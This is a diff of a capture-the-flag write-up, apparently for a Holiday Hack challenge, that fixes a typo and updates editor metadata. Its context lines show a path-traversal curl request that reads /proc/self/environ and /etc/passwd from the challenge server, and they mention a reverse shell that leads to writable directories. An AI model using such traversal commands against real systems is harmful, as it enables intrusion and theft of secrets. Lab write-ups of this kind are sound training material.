@@ -18,7 +18,7 @@ man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
 lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
 [...]
 ```
-Using this the value the environment variable can be obtained like this:
+Using this the value of the environment variable can be obtained like this:
 ```
 curl https://tag-generator.kringlecastle.com/image?id=../../proc/self/environ --output -
 PATH=/usr/local/bundle/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binHOSTNAME=cbf2810b7573RUBY_MAJOR=2.7RUBY_VERSION=2.7.0RUBY_DOWNLOAD_SHA256=27d350a52a02b53034ca0794efe518667d558f152656c2baaf08f3d0c8b02343GEM_HOME=/usr/local/bundleBUNDLE_SILENCE_ROOT_WARNING=1BUNDLE_APP_CONFIG=/usr/local/bundleAPP_HOME=/appPORT=4141HOST=0.0.0.0GREETZ=JackFrostWasHereHOME=/home/app
@@ -68,11 +68,11 @@ Now you have in the reverse shell listener an interactive shell as user `app`.
 The user `app` has write access to `/tmp` and `/home/app`.
 In addition the user has write access to `/usr/local/bundle`, where the web server is located.
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTYxMzQ0OTY1NiwtMTA1MjE2MzYxNywtMT
-c2MzU0MTM1NSwxNjA3MzQ4NTE0LC04MjMwNTA4NjEsMTI5Mzcy
-MDQzOSwxMzk1Nzk0ODI0LC0xNTk5MjU0NDE1LC02MTkyOTc0MT
-EsLTU3NjYxMDA3NSwyMTA3NTI5ODQ2LDkyMjE0NDM1LC0zOTg0
-OTE0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNzIsMTkzMzM2MTc4Ny
-wtMTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEzMTIwNTY0NTMsOTIw
-NDU1ODY1XX0=
+eyJoaXN0b3J5IjpbLTIxMjg5MjA5ODMsLTYxMzQ0OTY1NiwtMT
+A1MjE2MzYxNywtMTc2MzU0MTM1NSwxNjA3MzQ4NTE0LC04MjMw
+NTA4NjEsMTI5MzcyMDQzOSwxMzk1Nzk0ODI0LC0xNTk5MjU0ND
+E1LC02MTkyOTc0MTEsLTU3NjYxMDA3NSwyMTA3NTI5ODQ2LDky
+MjE0NDM1LC0zOTg0OTE0NjEsMTE1MTU1Njg5NiwyMzg0NjAyNz
+IsMTkzMzM2MTc4NywtMTQ2NzYxNTI2MiwtMjQzOTQyODY2LDEz
+MTIwNTY0NTNdfQ==
 -->
